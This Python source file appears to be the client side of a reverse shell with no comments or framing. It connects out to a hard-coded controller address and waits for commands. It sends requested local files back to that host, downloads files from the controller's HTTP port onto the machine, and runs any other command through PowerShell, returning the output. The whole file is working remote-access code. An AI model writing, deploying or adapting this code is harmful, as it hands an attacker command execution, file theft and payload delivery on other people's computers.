from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from subprocess import Popen, PIPE
from os import chdir, path, getcwd


IP = "192.168.0.104"
HTTP_PORT = 5000
PORT = 5002
header_size = 10
shell = socket(AF_INET, SOCK_STREAM)
shell.setsockopt(SOL_SOCKET, SO_REUSEADDR, 0)
shell.connect((IP, PORT))


while shell:
    full_msg = ''
    new_msg = True
    msg_len = 0
    while True:
        msg = shell.recv(16)
        if new_msg:
            msg_len = int(msg[:header_size])
            new_msg = False
        full_msg += msg.decode("utf-8")
        if len(full_msg) - header_size == msg_len:
            msg = full_msg[header_size:]
            msg = msg
            new_msg = True
            if "download" in msg:
                try:
                    filename = msg.replace("download", "").strip()
                    if path.exists(path.join(getcwd(), filename)):
                        op = open(path.join(getcwd(), filename), 'rb')
                        result = op.read().decode()
                    else:
                        result = "File not found"
                except:
                    result = "error"
            elif "upload" in msg:
                try:
                    filename = msg.replace("upload", "").strip()
                    header = f"""GET /upload/file/download/{filename} HTTP/1.1\n
Host: http://{IP}:{HTTP_PORT}\n
User-Agent: python-requests/2.28.1\n
Accept-Encoding: gzip, deflate\n
Accept: */*\n
Connection: keep-alive\r\n\r\n"""
                    http = socket(AF_INET, SOCK_STREAM)
                    http.settimeout(5)
                    http.connect((IP, HTTP_PORT))
                    print("connect")
                    http.sendall(header.encode())
                    response = http.recv(4096)
                    uplfile = open(filename, "wb")
                    if response.decode().find("HTTP/1.1 302 FOUND") < 0:
                        while response:
                            file = http.recv(4096)
                            if file:
                                uplfile.write(file)
                            else:
                                uplfile.flush()
                                uplfile.close()
                                http.close()
                                break
                        result = "Done"
                    else:
                        result = "File not found"
                except:
                    result = "error"
            elif "cd" in msg:
                try:
                    directory = msg.replace("cd", "").strip()
                    if path.exists(path.expanduser(directory)):
                        chdir(path.abspath(path.expanduser(directory)))
                    elif ".." in directory:
                        chdir("..")
                    result = str(getcwd().encode())
                except:
                    result = "error"
            else:
                try:
                    response = Popen(["powershell", "-Command", msg], stdout=PIPE, shell=True).communicate()[0].decode()
                    if not response:
                        response = "Done"
                    result = response

                except:
                    result =  "error"
            result = f"{len(result):<{header_size}}" + result
            shell.send(bytes(result, "utf-8"))
            full_msg = ""
